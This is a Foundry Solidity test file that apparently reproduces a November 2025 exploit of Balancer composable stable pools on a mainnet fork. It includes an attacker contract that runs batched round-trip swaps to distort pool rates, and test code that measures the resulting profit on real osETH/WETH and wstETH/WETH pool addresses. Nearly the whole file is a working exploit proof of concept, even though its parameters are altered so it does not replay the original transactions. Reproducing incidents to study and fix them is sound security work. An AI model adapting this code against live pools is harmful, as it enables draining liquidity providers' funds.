// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAsset {}

interface IBalancerVault {
    enum SwapKind {
        GIVEN_IN,
        GIVEN_OUT
    }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        IAsset[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external returns (int256[] memory assetDeltas);

    function getPoolTokens(bytes32 poolId)
        external
        view
        returns (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
}

interface IComposableStablePool {
    function getPoolId() external view returns (bytes32);
    function getRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function getActualSupply() external view returns (uint256);
}

contract SyntheticNoopAttacker {
    IBalancerVault internal immutable vault;

    constructor(address vault_) {
        vault = IBalancerVault(vault_);
    }

    function executeRoundTripBatchSwaps(
        bytes32 poolId,
        address tokenIn,
        address tokenMid,
        uint256 count,
        uint256 amountIn
    ) external {
        IERC20Like(tokenIn).approve(address(vault), type(uint256).max);
        IERC20Like(tokenMid).approve(address(vault), type(uint256).max);

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](count * 2);
        for (uint256 i = 0; i < count; i++) {
            uint256 j = i * 2;
            steps[j] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: amountIn,
                userData: ""
            });
            steps[j + 1] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: 0,
                userData: ""
            });
        }

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(tokenIn);
        assets[1] = IAsset(tokenMid);

        int256[] memory limits = new int256[](2);
        limits[0] = int256(uint256(type(uint128).max));
        limits[1] = int256(uint256(type(uint128).max));

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        vault.batchSwap(IBalancerVault.SwapKind.GIVEN_IN, steps, assets, funds, limits, block.timestamp + 1 days);
    }
}

contract BalancerComposableStableIncident20251103Test is Test {
    uint256 internal constant ONE = 1e18;

    // Ethereum mainnet
    uint256 internal constant CHAIN_ID = 1;
    uint256 internal constant FORK_BLOCK = 23_717_396; // block right before the first known attack tx

    // Reference tx logs from the incident timeline (used as context only, not replayed).
    bytes32 internal constant REF_STAGE1_TX = 0x6ed07d4f1f4200c3dcf52f3ec8e893f53190df39f58d13df86e18f0fd24f5601;
    bytes32 internal constant REF_STAGE2_TX = 0xa63f7cf25ed31a52e86f91395f1f0a73d25b3f40ea09f30f80adce77e3f4f804;
    bytes32 internal constant REF_STAGE3_TX = 0xa1c9fddf88c495f0ee7a6a807765405998788365577f4545866c43c7bf620d43;
    bytes32 internal constant REF_STAGE4_TX = 0x4fd214f2f5f08f30211e9ae7f5a804f00f87f25cc36f46823f200761f1486925;

    // Core addresses
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant OSETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant OSETH_WETH_BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address internal constant WSTETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;

    // Values observed in public analyses for stage-1 (reference only).
    uint256 internal constant OBSERVED_NOOP_COUNT = 200;
    uint256 internal constant OBSERVED_NOOP_AMOUNT = 128370411097832943;

    // Synthetic PoC params (intentionally different from observed values to avoid tx replay).
    uint256 internal constant SYNTH_NOOP_COUNT = 173;
    uint256 internal constant SYNTH_NOOP_AMOUNT = 121000000000000000; // 0.121 WETH
    uint256 internal constant SEED_WETH_FOR_BPT = 100 ether;
    uint256 internal constant SEED_WETH_FOR_REALIZED = 20 ether;

    IBalancerVault internal vault;
    IComposableStablePool internal osEthPool;
    IComposableStablePool internal wstEthPool;

    address internal attackerEoa;
    SyntheticNoopAttacker internal attacker;
    bool internal forkReady;

    struct PoolSnapshot {
        uint256 rate;
        uint256 totalSupply;
        uint256 actualSupply;
        uint256 wethBalance;
        uint256 pairedTokenBalance;
    }

    struct DryRunSwapResult {
        bool ok;
        uint256 amountOut;
        string revertReason;
    }

    struct BaselineBook {
        uint16[10] bps;
        uint256[10] bptIn;
        bool[10] ok;
        uint256[10] wethOut;
    }

    struct UnwindExecution {
        uint256 chosenBps;
        uint256 chosenBptIn;
        uint256 baselineOut;
        uint256 postQuote;
        uint256 actualOut;
        uint256 walletDelta;
        int256 realizedEdgeVsBaseline;
        uint256 estimatedLinearCostBasis;
        int256 estimatedAbsolutePnl;
    }

    function setUp() public {
        string memory rpc = vm.envOr("MAINNET_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            emit log("MAINNET_RPC_URL not set. Skipping fork-dependent Balancer PoC.");
            return;
        }

        uint256 forkId = vm.createFork(rpc, FORK_BLOCK);
        vm.selectFork(forkId);
        if (block.chainid != CHAIN_ID) {
            emit log_named_uint("Unexpected chainId", block.chainid);
            return;
        }

        vault = IBalancerVault(BALANCER_VAULT);
        osEthPool = IComposableStablePool(OSETH_WETH_BPT);
        wstEthPool = IComposableStablePool(WSTETH_WETH_BPT);
        attackerEoa = makeAddr("synthetic_attacker");
        attacker = new SyntheticNoopAttacker(BALANCER_VAULT);
        forkReady = true;
    }

    function test_poc_profit_logging_without_raw_tx_replay() public {
        if (!forkReady) return;

        // Explicit guard: this PoC must not be identical to the known stage-1 tx settings.
        assertTrue(
            SYNTH_NOOP_COUNT != OBSERVED_NOOP_COUNT || SYNTH_NOOP_AMOUNT != OBSERVED_NOOP_AMOUNT,
            "synthetic params must differ from observed tx logs"
        );

        _logReferenceTxs();
        emit log("=== Step 0: Snapshot before distortion ===");
        PoolSnapshot memory osBefore = _snapshot(osEthPool, OSETH);
        PoolSnapshot memory wstBefore = _snapshot(wstEthPool, WSTETH);
        _logPoolSnapshot("osETH/WETH before", osBefore);
        _logPoolSnapshot("wstETH/WETH before", wstBefore);

        emit log("=== Step 1: Build attacker positions (BPT + osETH inventory) ===");
        uint256 totalSeed = SEED_WETH_FOR_BPT + SEED_WETH_FOR_REALIZED;
        deal(WETH, attackerEoa, totalSeed);
        vm.startPrank(attackerEoa);
        IERC20Like(WETH).approve(BALANCER_VAULT, type(uint256).max);
        IERC20Like(OSETH).approve(BALANCER_VAULT, type(uint256).max);
        IERC20Like(OSETH_WETH_BPT).approve(BALANCER_VAULT, type(uint256).max);
        uint256 bptAcquired = _swapExactIn(osEthPool.getPoolId(), WETH, OSETH_WETH_BPT, SEED_WETH_FOR_BPT, attackerEoa);
        uint256 osEthInventory = _swapExactIn(osEthPool.getPoolId(), WETH, OSETH, SEED_WETH_FOR_REALIZED, attackerEoa);
        vm.stopPrank();
        emit log_named_decimal_uint("attacker total seed WETH", totalSeed, 18);
        emit log_named_decimal_uint("attacker BPT seed WETH", SEED_WETH_FOR_BPT, 18);
        emit log_named_decimal_uint("attacker realized-leg seed WETH", SEED_WETH_FOR_REALIZED, 18);
        emit log_named_decimal_uint("attacker acquired BPT", bptAcquired, 18);
        emit log_named_decimal_uint("attacker acquired osETH inventory", osEthInventory, 18);

        uint256 mtmBefore = (bptAcquired * osBefore.rate) / ONE;
        emit log_named_decimal_uint("attacker MTM before distortion (WETH)", mtmBefore, 18);

        BaselineBook memory baseline = _collectPreDistortionBaseline(osEthPool.getPoolId(), OSETH, WETH, osEthInventory);

        emit log("=== Step 2: Distort rate via synthetic no-op round-trips (not raw tx replay) ===");
        deal(WETH, address(attacker), 1_000 ether);
        vm.prank(attackerEoa);
        attacker.executeRoundTripBatchSwaps(osEthPool.getPoolId(), WETH, OSETH, SYNTH_NOOP_COUNT, SYNTH_NOOP_AMOUNT);
        vm.prank(attackerEoa);
        attacker.executeRoundTripBatchSwaps(wstEthPool.getPoolId(), WETH, WSTETH, SYNTH_NOOP_COUNT, SYNTH_NOOP_AMOUNT);
        emit log_named_uint("synthetic noop count", SYNTH_NOOP_COUNT);
        emit log_named_decimal_uint("synthetic noop amount (per leg, WETH)", SYNTH_NOOP_AMOUNT, 18);

        emit log("=== Step 3: Snapshot after distortion + unrealized PnL ===");
        PoolSnapshot memory osAfter = _snapshot(osEthPool, OSETH);
        PoolSnapshot memory wstAfter = _snapshot(wstEthPool, WSTETH);
        _logPoolSnapshot("osETH/WETH after", osAfter);
        _logPoolSnapshot("wstETH/WETH after", wstAfter);

        uint256 mtmAfter = (bptAcquired * osAfter.rate) / ONE;
        int256 mtmProfit = int256(mtmAfter) - int256(mtmBefore);
        emit log_named_decimal_uint("attacker MTM after distortion (WETH)", mtmAfter, 18);
        emit log_named_decimal_int("attacker MTM profit (WETH)", mtmProfit, 18);

        UnwindExecution memory unwindExec =
            _executeRealizedSwap(osEthPool.getPoolId(), baseline, OSETH, WETH, SEED_WETH_FOR_REALIZED);

        // Success criteria
        bool osBroken = _invariantBroken(osBefore, osAfter);
        bool wstBroken = _invariantBroken(wstBefore, wstAfter);
        assertTrue(osBroken || wstBroken, "invariant did not move");
        assertGt(mtmAfter, mtmBefore, "attacker MTM profit <= 0");
        assertEq(unwindExec.actualOut, unwindExec.walletDelta, "wallet delta mismatch");
        assertGt(unwindExec.realizedEdgeVsBaseline, 0, "realized edge <= 0");
    }

    function _snapshot(IComposableStablePool pool, address pairedToken) internal view returns (PoolSnapshot memory s) {
        s.rate = pool.getRate();
        s.totalSupply = pool.totalSupply();
        s.actualSupply = pool.getActualSupply();
        (s.wethBalance, s.pairedTokenBalance) = _vaultBalancesByToken(pool.getPoolId(), pairedToken);
    }

    function _invariantBroken(PoolSnapshot memory before_, PoolSnapshot memory after_) internal pure returns (bool) {
        return before_.rate != after_.rate || before_.totalSupply != after_.totalSupply
            || before_.actualSupply != after_.actualSupply || before_.wethBalance != after_.wethBalance
            || before_.pairedTokenBalance != after_.pairedTokenBalance;
    }

    function _logReferenceTxs() internal {
        emit log("=== Reference incident tx hashes (context from logs) ===");
        emit log_named_bytes32("stage1", REF_STAGE1_TX);
        emit log_named_bytes32("stage2", REF_STAGE2_TX);
        emit log_named_bytes32("stage3", REF_STAGE3_TX);
        emit log_named_bytes32("stage4", REF_STAGE4_TX);
    }

    function _logPoolSnapshot(string memory label, PoolSnapshot memory s) internal {
        emit log_named_decimal_uint(string.concat(label, " rate"), s.rate, 18);
        emit log_named_decimal_uint(string.concat(label, " totalSupply"), s.totalSupply, 18);
        emit log_named_decimal_uint(string.concat(label, " actualSupply"), s.actualSupply, 18);
        emit log_named_decimal_uint(string.concat(label, " WETH balance"), s.wethBalance, 18);
        emit log_named_decimal_uint(string.concat(label, " paired token balance"), s.pairedTokenBalance, 18);
    }

    function _swapExactIn(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn, address actor)
        internal
        returns (uint256 amountOut)
    {
        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](1);
        steps[0] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: amountIn,
            userData: ""
        });

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(tokenIn);
        assets[1] = IAsset(tokenOut);

        int256[] memory limits = new int256[](2);
        limits[0] = int256(uint256(type(uint128).max));
        limits[1] = int256(uint256(type(uint128).max));

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: actor,
            fromInternalBalance: false,
            recipient: payable(actor),
            toInternalBalance: false
        });

        int256[] memory deltas =
            vault.batchSwap(IBalancerVault.SwapKind.GIVEN_IN, steps, assets, funds, limits, block.timestamp + 1 days);
        require(deltas.length == 2, "unexpected deltas length");
        require(deltas[1] < 0, "expected tokenOut credit");
        amountOut = uint256(-deltas[1]);
    }

    function swapExactInAsActor(bytes32 poolId, address tokenIn, address tokenOut, uint256 amountIn, address actor)
        external
        returns (uint256 amountOut)
    {
        vm.startPrank(actor);
        amountOut = _swapExactIn(poolId, tokenIn, tokenOut, amountIn, actor);
        vm.stopPrank();
    }

    function _decodeRevertString(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) return "empty/short revert data";

        bytes4 selector;
        assembly {
            selector := shr(224, mload(add(revertData, 0x20)))
        }
        if (selector == 0x08c379a0) return "Error(string)";
        if (selector == 0x4e487b71) return "Panic(uint256)";
        return "custom/unknown selector";
    }

    function _collectPreDistortionBaseline(bytes32 poolId, address tokenIn, address tokenOut, uint256 tokenInInventory)
        internal
        returns (BaselineBook memory book)
    {
        emit log("=== Step 1.5: Build pre-distortion realized baseline via dry-run ===");
        book.bps = _unwindBpsCandidates();
        for (uint256 i = 0; i < book.bps.length; i++) {
            uint256 tokenInAmount = (tokenInInventory * book.bps[i]) / 10_000;
            book.bptIn[i] = tokenInAmount;
            if (tokenInAmount == 0) continue;

            DryRunSwapResult memory preRun =
                _dryRunSwapExactInAsActor(attackerEoa, poolId, tokenIn, tokenOut, tokenInAmount);
            if (preRun.ok) {
                book.ok[i] = true;
                book.wethOut[i] = preRun.amountOut;
                emit log_named_string("pre baseline status", "ok");
                emit log_named_uint("pre baseline bps", book.bps[i]);
                emit log_named_decimal_uint("pre baseline tokenIn amount", tokenInAmount, 18);
                emit log_named_decimal_uint("pre baseline WETH out", preRun.amountOut, 18);
            } else {
                emit log_named_string("pre baseline status", "revert");
                emit log_named_uint("pre baseline bps", book.bps[i]);
                emit log_named_string("pre baseline revert", preRun.revertReason);
            }
        }
    }

    function _executeRealizedSwap(
        bytes32 poolId,
        BaselineBook memory baseline,
        address tokenIn,
        address tokenOut,
        uint256 tokenInSeedCost
    ) internal returns (UnwindExecution memory exec) {
        emit log("=== Step 4: Realized PnL via executable swap search ===");
        for (uint256 i = 0; i < baseline.bps.length; i++) {
            if (!baseline.ok[i]) continue;

            uint256 bptIn = baseline.bptIn[i];
            DryRunSwapResult memory postRun = _dryRunSwapExactInAsActor(attackerEoa, poolId, tokenIn, tokenOut, bptIn);
            if (!postRun.ok) {
                emit log_named_string("post candidate status", "revert");
                emit log_named_uint("post candidate bps", baseline.bps[i]);
                emit log_named_string("post candidate revert", postRun.revertReason);
                continue;
            }

            exec.chosenBps = baseline.bps[i];
            exec.chosenBptIn = bptIn;
            exec.baselineOut = baseline.wethOut[i];
            exec.postQuote = postRun.amountOut;
            break;
        }

        require(exec.chosenBptIn > 0, "no executable unwind candidate");
        emit log_named_uint("chosen realized bps", exec.chosenBps);
        emit log_named_decimal_uint("chosen tokenIn amount", exec.chosenBptIn, 18);
        emit log_named_decimal_uint("chosen pre-distortion quote (WETH out)", exec.baselineOut, 18);
        emit log_named_decimal_uint("chosen post-distortion quote (WETH out)", exec.postQuote, 18);

        uint256 attackerWethBeforeUnwind = IERC20Like(WETH).balanceOf(attackerEoa);
        (bool unwindOk, bytes memory unwindRet) = address(this).call(
            abi.encodeCall(this.swapExactInAsActor, (poolId, tokenIn, tokenOut, exec.chosenBptIn, attackerEoa))
        );
        require(unwindOk, _decodeRevertString(unwindRet));

        exec.actualOut = abi.decode(unwindRet, (uint256));
        uint256 attackerWethAfterUnwind = IERC20Like(WETH).balanceOf(attackerEoa);
        exec.walletDelta = attackerWethAfterUnwind - attackerWethBeforeUnwind;
        exec.realizedEdgeVsBaseline = int256(exec.actualOut) - int256(exec.baselineOut);
        exec.estimatedLinearCostBasis = (tokenInSeedCost * exec.chosenBps) / 10_000;
        exec.estimatedAbsolutePnl = int256(exec.actualOut) - int256(exec.estimatedLinearCostBasis);

        emit log_named_decimal_uint("actual unwind WETH out", exec.actualOut, 18);
        emit log_named_decimal_uint("attacker wallet WETH delta", exec.walletDelta, 18);
        emit log_named_decimal_int("realized edge vs pre-distortion quote (WETH)", exec.realizedEdgeVsBaseline, 18);
        emit log_named_decimal_uint("estimated linear cost basis (WETH)", exec.estimatedLinearCostBasis, 18);
        emit log_named_decimal_int("estimated absolute realized pnl (WETH)", exec.estimatedAbsolutePnl, 18);
    }

    function _dryRunSwapExactInAsActor(
        address actor,
        bytes32 poolId,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal returns (DryRunSwapResult memory res) {
        uint256 snapshotId = vm.snapshotState();
        (bool ok, bytes memory ret) =
            address(this).call(abi.encodeCall(this.swapExactInAsActor, (poolId, tokenIn, tokenOut, amountIn, actor)));
        bool restored = vm.revertToState(snapshotId);
        require(restored, "snapshot restore failed");

        if (ok) {
            res.ok = true;
            res.amountOut = abi.decode(ret, (uint256));
        } else {
            res.ok = false;
            res.revertReason = _decodeRevertString(ret);
        }
    }

    function _vaultBalancesByToken(bytes32 poolId, address pairedToken)
        internal
        view
        returns (uint256 wethBal, uint256 pairedBal)
    {
        (address[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(poolId);
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == WETH) wethBal = balances[i];
            if (tokens[i] == pairedToken) pairedBal = balances[i];
        }
    }

    function _unwindBpsCandidates() internal pure returns (uint16[10] memory candidates) {
        candidates[0] = 1_000;
        candidates[1] = 500;
        candidates[2] = 200;
        candidates[3] = 100;
        candidates[4] = 50;
        candidates[5] = 20;
        candidates[6] = 10;
        candidates[7] = 5;
        candidates[8] = 2;
        candidates[9] = 1;
    }
}
